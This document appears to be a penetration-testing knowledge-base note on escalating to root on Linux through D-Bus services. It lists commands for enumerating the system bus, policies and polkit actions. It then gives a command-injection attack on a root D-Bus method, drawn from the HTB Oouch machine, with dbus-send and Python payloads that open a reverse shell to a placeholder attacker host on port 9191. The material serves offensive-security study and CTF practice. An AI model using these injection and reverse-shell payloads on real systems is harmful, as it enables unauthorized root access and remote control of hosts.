---
title: "Linux D-Bus Privilege Escalation"
type: technique
tags: [linux, privilege-escalation, dbus]
phase: privilege-escalation
date_created: 2026-07-14
date_updated: 2026-07-14
sources: [hacktricks-linux]
---

# Linux D-Bus Privilege Escalation

> Part of [[linux-privesc]]. Same IPC-to-root idea as the writable UNIX/systemd socket primitive there.

## What it is

Privileged daemons expose methods on the D-Bus system bus; a permissive policy plus a method that shells out is direct root. Enumerate first, then correlate three layers (activation metadata, D-Bus XML policy, polkit action) to know what a call will actually run.

## Enumerate the system bus

```bash
busctl list                                   # all bus names; note root PIDs and (activatable) services
busctl status <name>                          # UID/EUID + CommandLine of the backing binary
busctl tree <name>                            # object paths
busctl introspect <name> <objpath>            # methods + signatures ("s" = string arg)
# who is allowed to talk to it, and what starts it:
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services 2>/dev/null
pkaction --verbose                            # polkit actions gating the methods
```

Read-probe a low-risk method first to separate "wrong syntax" from "denied" from "allowed":

```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
```

## Command-inject a root service method

If a root-owned service method passes its string argument into `system()`/`sprintf`+`system` (the classic HTB Oouch `htb.oouch.Block` pattern), inject a command:

```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block \
  htb.oouch.Block.Block string:';bash -c "bash -i >& /dev/tcp/ATTACKER/9191 0>&1" #'
```

```python
import dbus
bus = dbus.SystemBus()
iface = dbus.Interface(bus.get_object('htb.oouch.Block','/htb/oouch/Block'), 'htb.oouch.Block')
iface.Block(";bash -c 'bash -i >& /dev/tcp/ATTACKER/9191 0>&1' #")
```

Watch for `(activatable)` services (not running but a call starts them), and root proxy/bridge services that forward calls without re-checking the caller UID (CVE-2025-23222 dde-api-proxy class). Automate with `dbus-map` (`sudo dbus-map --enable-probes --null-agent --dump-methods`) and `uptux.py` (flags `send_destination="*"`).
